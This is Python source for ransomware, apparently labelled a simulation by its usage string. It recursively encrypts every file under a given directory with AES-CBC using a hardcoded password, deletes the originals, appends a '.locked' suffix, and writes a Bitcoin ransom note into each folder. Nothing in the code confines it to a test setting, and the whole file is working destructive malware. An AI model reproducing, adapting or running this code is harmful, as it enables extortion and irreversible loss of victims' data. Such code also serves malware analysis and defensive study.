import os
from pathlib import Path
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Configuration
PASSWORD = b'SecretRansomKey123!'
SUFFIX = ".locked"
RANSOM_NOTE = "Your files have been encrypted.\nPay 1 Bitcoin to XYZ address to get the key."
BACKEND = default_backend()

# Key derivation
def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=BACKEND
    )
    return kdf.derive(password)

# Encrypt file
def encrypt_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        salt = os.urandom(16)
        iv = os.urandom(16)
        key = derive_key(PASSWORD, salt)

        padder = padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=BACKEND)
        enc = cipher.encryptor().update(padded) + cipher.encryptor().finalize()

        new_path = str(path) + SUFFIX
        with open(new_path, "wb") as f:
            f.write(salt + iv + enc)
        os.remove(path)
        return new_path
    except Exception as e:
        return None

# Drop ransom note
def drop_ransom_note(directory):
    note = os.path.join(directory, "README_RESTORE_FILES.txt")
    if not os.path.exists(note):
        with open(note, "w") as f:
            f.write(RANSOM_NOTE)

# Encrypt recursively
def encrypt_directory(target_dir, log_path="/tmp/ransom_log.txt"):
    with open(log_path, "w") as log:
        for root, _, files in os.walk(target_dir):
            drop_ransom_note(root)
            for file in files:
                if file.endswith(SUFFIX) or file == "README_RESTORE_FILES.txt":
                    continue
                full_path = os.path.join(root, file)
                result = encrypt_file(full_path)
                if result:
                    log.write(result + "\n")

# Entry point
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python ransomware_sim.py /path/to/target_directory")
        exit(1)
    encrypt_directory(sys.argv[1])